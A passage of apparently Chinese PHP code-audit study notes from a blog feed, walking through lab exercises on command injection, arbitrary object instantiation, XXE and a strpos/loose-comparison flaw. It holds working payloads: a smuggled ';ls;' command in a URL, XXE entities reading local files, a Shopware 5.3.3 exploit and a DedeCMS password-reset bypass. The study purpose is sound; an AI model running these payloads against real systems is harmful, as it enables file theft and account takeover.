<p>接着要绕过 <strong>parse_url</strong> 函数，并且满足 <strong>$site_info[‘host’]</strong> 的值以 <strong><a href="http://sec-redclub.com">sec-redclub.com</a></strong> 结尾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p>第一个<code>%22</code>用于闭合前面的双引号，分号可以在Linux系统上连续执行命令，后面一个<code>%22</code>用于闭合后面的引号。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习——Day3</title>
    <url>/code_audit/PHP/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习Day3——实例化任意对象漏洞">PHP代码审计学习Day3——实例化任意对象漏洞</h1>
<h2 id="0x01-Snow-flake">0x01 Snow flake</h2>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$className</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$data = $_GET[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;There is no page with this name&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;new&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering new response&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering old response&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="class-exist-文件包含漏洞"><code>class_exist()</code>文件包含漏洞</h3>
<p>首先来看<code>class_exist()</code>的定义：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.class-exists.php">class_exists </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：检查类是否已定义</p>
<p><strong>定义</strong> ： <code>bool class_exists ( string $class_name[, bool $autoload = true ] )</code></p>
<p><strong>$class_name</strong> 为类的名字，在匹配的时候不区分大小写。默认情况下 <strong>$autoload</strong> 为 <strong>true</strong> ，当 <strong>$autoload</strong> 为 <strong>true</strong> 时，会自动加载本程序中的 <strong>__autoload</strong> 函数；当 <strong>$autoload</strong> 为 <strong>false</strong> 时，则不调用 <strong>__autoload</strong> 函数。</p>
</blockquote>
<p>上面这个例子中，<code>class_exist()</code>会直接调用<code>__autoload()</code>函数，而<code>__autoload()</code>函数的参数可以用户可控的，攻击者可以使用路径穿越来包含任意文件。</p>
<blockquote>
<p>使用路径穿越符号的前提是PHP版本小于5.4</p>
</blockquote>
<h3 id="SimpleXMLElementXXE漏洞"><code>SimpleXMLElement</code>XXE漏洞</h3>
<p>第9行代码中，实例化类的类名和参数均在用户控制之下，那么攻击者就可以通过这个漏洞，调用PHP代码库的任意构造函数。也可以使用PHP内置类<code>SimpleXMLElement</code>进行XXE攻击，进而读取文件内容和命令执行（PHP安装expect扩展）。</p>
<blockquote>
<p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p>
</blockquote>
<p>用法也比较简单，直接传入一个包含恶意payload的XML代码即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = &lt;&lt;&lt;EOF</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///E:/phpStudy/PHPTutorial/flag.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xee&lt;/x&gt;</span><br><span class="line">EOF;</span><br><span class="line">$xml_class = <span class="keyword">new</span> SimpleXMLElement($xml, LIBXML_NOENT);</span><br><span class="line">var_dump($xml_class);</span><br></pre></td></tr></table></figure>
<h2 id="0x02-实例分析">0x02 实例分析</h2>
<p>这次的实例分析用到的是Shopware 5.3.3版本，后台代码其中有一处提供了动态新建类的函数，然而并没有对新建的类进行限制，由于新建的类名和传递的参数都是我们可以控制的，从而造成漏洞。入口点是在<code>engine\Shopware\Controllers\Backend\ProductStream.php</code>文件中有一个<code>loadPreviewAction</code>方法，作用是用来浏览产品流的详细信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shopware_Controllers_Backend_ProductStream</span> <span class="keyword">extends</span> <span class="title">Shopware_Controllers_Backend_Application</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadPreviewAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $conditions = <span class="keyword">$this</span>-&gt;Request()-&gt;getParam(<span class="string">&#x27;conditions&#x27;</span>);</span><br><span class="line">        $conditions = json_decode($conditions, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $sorting = <span class="keyword">$this</span>-&gt;Request()-&gt;getParam(<span class="string">&#x27;sort&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        $criteria = <span class="keyword">new</span> Criteria();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> RepositoryInterface $streamRepo */</span></span><br><span class="line">        $streamRepo = <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;shopware_product_stream.repository&#x27;</span>);</span><br><span class="line">        $sorting = $streamRepo-&gt;unserialize($sorting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($sorting <span class="keyword">as</span> $sort) &#123;</span><br><span class="line">            $criteria-&gt;addSorting($sort);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $conditions = $streamRepo-&gt;unserialize($conditions);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($conditions <span class="keyword">as</span> $condition) &#123;</span><br><span class="line">            $criteria-&gt;addCondition($condition);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该方法接收从用户传来的参数 <code>sort </code>，然后传入 <code>Repository </code>类的 <code>unserialize </code>方法，继续跟进<code>unserialize()</code>方法，实际上是调用<code> engine\Shopware\Components\LogawareReflectionHelper.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$serialized, $errorSource</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $classes = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($serialized <span class="keyword">as</span> $className =&gt; $arguments) &#123;</span><br><span class="line">            $className = explode(<span class="string">&#x27;|&#x27;</span>, $className);</span><br><span class="line">            $className = $className[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $classes[] = <span class="keyword">$this</span>-&gt;reflector-&gt;createInstanceFromNamedArguments($className, $arguments);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;logger-&gt;critical($errorSource . <span class="string">&#x27;: &#x27;</span> . $e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $classes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的 <code>$serialized</code> 就是我们刚刚传入的 <code>sort</code> （上图第3行），程序分别从 <code>sort</code> 中提取出值赋给 <code>$className</code> 和 <code>$arguments</code> 变量，然后这两个变量被传入 ReflectionHelper 类的 <code>createInstanceFromNamedArguments</code> 方法，继续跟进这个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createInstanceFromNamedArguments</span>(<span class="params">$className, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $reflectionClass = <span class="keyword">new</span> \ReflectionClass($className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$reflectionClass-&gt;getConstructor()) &#123;</span><br><span class="line">            <span class="keyword">return</span> $reflectionClass-&gt;newInstance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $constructorParams = $reflectionClass-&gt;getConstructor()-&gt;getParameters();</span><br><span class="line"></span><br><span class="line">        $newParams = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($constructorParams <span class="keyword">as</span> $constructorParam) &#123;</span><br><span class="line">            $paramName = $constructorParam-&gt;getName();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>($arguments[$paramName])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!$constructorParam-&gt;isOptional()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(sprintf(<span class="string">&quot;Required constructor Parameter Missing: &#x27;$%s&#x27;.&quot;</span>, $paramName));</span><br><span class="line">                &#125;</span><br><span class="line">                $newParams[] = $constructorParam-&gt;getDefaultValue();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $newParams[] = $arguments[$paramName];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $reflectionClass-&gt;newInstanceArgs($newParams);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的第一行就是创建了一个反射类，而类名就是来自我们传入的<code>sort</code>参数。最后一句<code>return</code>时根据参数<code>newInstanceArgs</code>创建了一个新的实例对象，参数<code>newInstanceArgs</code>是从<code>$arguments[$paraName]</code>中取值，并且<code>$arguments</code>是用户可控的，那么当我们传入类名为<code>SimpleXMLElement</code>时，实例化后，会将传入的参数进行<code>xml</code>解析。</p>
<blockquote>
<p>中间的那一段for循环，大概意思就是如果没有传入非可选参数时直接报错，没有传入非可选参数时会赋默认值。</p>
</blockquote>
<blockquote>
<p>具体的分析文章：<a href="https://www.freebuf.com/vuls/154415.html">https://www.freebuf.com/vuls/154415.html</a></p>
</blockquote>
<h2 id="0x03-漏洞利用">0x03 漏洞利用</h2>
<p>搭建这个环境花了我一天的时间，最后还是用的其他师傅已经做好的docker镜像跑起来的，但是这个环境还是没有办法调试。</p>
<blockquote>
<p>环境：</p>
<p>Windows 10 2004</p>
<p>Docker 2.2.0.5</p>
<p>搭建步骤：</p>
<p>docker pull gaoxijiejie/shopware:okay</p>
<p>docker run -i -t -p 8000:80 gaoxijiejie/shopware bash</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200613202832.png" alt=""></p>
<p>当我们点击 Refresh preview 按钮时，就会调用 <code>loadPreviewAction</code> 方法，用BurpSuite抓到包如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200613203100.png" alt=""></p>
<p>其中主要就是sort参数的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D</span><br></pre></td></tr></table></figure>
<p>Url解码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;ASC&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>为了构造类似的payload，先来查看<code>SimpleXMLElement</code>类的构造函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] )</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200613203539.png" alt=""></p>
<p>为了减少Payload的长度，我们要传入<code>data_is_url=TRUE</code>使得可以用URL传入恶意XML数据，那么Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http:&#x2F;&#x2F;172.19.14.43:8000&#x2F;xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><code>xxe.xml</code>文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">     &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>
<p>当然这个是属于Blind XXE，是没有回显的，只能用外部DTD来外带数据，但是这种没能复现成功，而且也不能调试，蛮遗憾的。</p>
<h2 id="0x04-练习题">0x04 练习题</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">	<span class="function"><span class="keyword">function</span> (<span class="params">$class</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">new</span> NotFound();</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) ? $_GET[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;param&#x27;</span>]) ? $_GET[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;param2&#x27;</span>]) ? $_GET[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">	$newclass = <span class="keyword">new</span> $classname($param,$param2);</span><br><span class="line">	var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">&#x27;=&gt;&#x27;</span>.$value.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据上面的知识储备，我们在上图第18行处可以看到使用了 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a href="http://php.net/manual/en/function.spl-autoload-register.php">spl_autoload_register</a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p>
<blockquote>
<p><a href="https://segmentfault.com/a/1190000012203213">PHP 自动加载 深度总结</a></p>
</blockquote>
<p>首先我们用<code>GlobIterator</code> 类搜索flag文件名字，构造方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public GlobIterator::__construct ( string $pattern [, int $flags &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</span><br></pre></td></tr></table></figure>
<p>第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我们用它的默认值<code>CURRENT_AS_FILEINFO</code>即可，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614000014.png" alt=""></p>
<p>第二步用<code>SimpleXMLElement</code>类读取flag，这里因为文件中存在<code>&lt; &gt; &amp; ' &quot;</code>符号，所以需要对读取的数据进行base64编码，不然会导致XML解析失败，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;SimpleXMLElement&amp;para&#x3D;?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;para2&#x3D;2</span><br></pre></td></tr></table></figure>
<p>第一个参数的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>
<p>第二个参数实际上这里2对应的模式是 <strong>LIBXML_NOENT</strong>，因为在libxml&gt;=2.9.0以后的版本默认不开启外部实体解析，需要添加这个参数开启。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614002436.png" alt=""></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计——Day3</title>
    <url>/code_audit/PHP/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习Day4——strpos函数缺陷">PHP代码审计学习Day4——strpos函数缺陷</h1>
<h2 id="0x01-False-Beard">0x01 False Beard</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$user, $pass</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span>(<span class="params">$user, $pass</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (!strpos($user, <span class="string">&#x27;&lt;&#x27;</span>) || !strpos($user, <span class="string">&#x27;&gt;&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (!strpos($pass, <span class="string">&#x27;&lt;&#x27;</span>) || !strpos($pass, <span class="string">&#x27;&gt;&#x27;</span>))</span><br><span class="line">    ) &#123;</span><br><span class="line">      $format = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span> .</span><br><span class="line">        <span class="string">&#x27;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#x27;</span>;</span><br><span class="line">      $xml = sprintf($format, $user, $pass);</span><br><span class="line">      $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">      <span class="comment">// Perform the actual login.</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">&#x27;username&#x27;</span>], $_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这段程序使用格式化字符串的方式，用XML结构存储用户的登录信息，这种情况容易造成XML注入。第8行和第9行使用了<code>strpos</code>函数来防止用户输入的参数包含<code>&lt;</code>和<code> &gt;</code>这个两个符号。先来看看<code>strpos</code>函数的定义：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614114602.png" alt=""></p>
<p>在这道题目中，开发者只考虑到 <strong>strpos</strong> 函数返回 <strong>false</strong> 的情况，却忽略了匹配到的字符在首位时会返回 <strong>0</strong> 的情况，因为 <strong>false</strong> 和 <strong>0</strong> 的取反均为 <strong>true</strong>，这样就可以通过闭合<code>&quot;</code>的方式来注入XML。Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&quot;&#x2F;&gt;&lt;injected-tag%20property&#x3D;&quot;&amp;password&#x3D;&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是这段代码<code>SimpleXMLElement</code>并没有指定LIBXML_NOENT参数，从而不能读取外部实体，不知道在这个地方这样的XML注入能有什么危害。</p>
</blockquote>
<h2 id="0x02-实例分析">0x02 实例分析</h2>
<h3 id="漏洞利用">漏洞利用</h3>
<p>首先在后台开启会员功能：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614171333.png" alt=""></p>
<p>注册两个会员，<strong>并且不能设置密保问题</strong>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614171531.png" alt=""></p>
<p>在登录账号test1的情况下访问下面链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecmsmember&#x2F;resetpassword.php?dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;3</span><br></pre></td></tr></table></figure>
<p>burp抓包重放：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614173258.png" alt=""></p>
<p>然后带着id与key访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;PHP-Audit-Labs&#x2F;Day4&#x2F;dedecms&#x2F;member&#x2F;resetpassword.php?dopost&#x3D;getpasswd&amp;id&#x3D;3&amp;key&#x3D;PFhZR7Go</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614173531.png" alt=""></p>
<p>自动填充了test2，那么我们就可以任意用户密码重置。</p>
<h3 id="代码分析">代码分析</h3>
<p>根据漏洞url定位到<code>member\resetpassword.php</code>的<code>safequestion</code>操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $mid = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">    $sql = <span class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion)) $safequestion = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer)) $safeanswer = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$row[&#x27;safequestion&#x27;]:&quot;0&quot;  $row[&#x27;safeanswer&#x27;]:&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">&#x27;safequestion&#x27;</span>] == $safequestion &amp;&amp; $row[<span class="string">&#x27;safeanswer&#x27;</span>] == $safeanswer)</span><br><span class="line">    &#123;</span><br><span class="line">        sn($mid, $row[<span class="string">&#x27;userid&#x27;</span>], $row[<span class="string">&#x27;email&#x27;</span>], <span class="string">&#x27;N&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里先根据传入的<code>id</code>参数查询对应用户的<code>密保问题答案</code> 、<code>userid</code>、 <code>邮箱</code>等信息,接着下面进行判断,如果传入的<code>$safequestion</code>与<code>$safeanswer</code>非空且与之前设置的相等,就进入<code>sn()</code>函数操作 它这里用的是 <code>==</code> 而非 <code>===</code> 来判断,所以这里是可以绕过的：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614173931.png" alt=""></p>
<p>那么这里我们就可以用<code>safequestion=0.0&amp;safeanswer=</code>即可使<code>$row['safequestion'] == $safequestion &amp;&amp; $row['safeanswer'] == $safeanswer)</code>为true,进入<code>sn()</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sn</span>(<span class="params">$mid,$userid,$mailto, $send = <span class="string">&#x27;Y&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    $tptim= (<span class="number">60</span>*<span class="number">10</span>);</span><br><span class="line">    $dtime = time();</span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(!is_array($row))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//发送新邮件；</span></span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">&#x27;INSERT&#x27;</span>,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//10分钟后可以再次发送新验证码；</span></span><br><span class="line">    <span 